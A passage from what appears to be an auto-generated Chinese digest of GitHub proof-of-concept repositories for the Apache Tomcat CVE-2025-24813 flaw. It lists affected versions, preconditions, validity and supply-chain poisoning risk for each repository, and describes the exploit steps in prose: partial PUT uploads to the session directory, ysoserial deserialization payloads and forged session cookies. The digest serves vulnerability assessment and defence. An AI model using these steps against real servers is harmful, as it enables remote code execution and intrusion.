CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

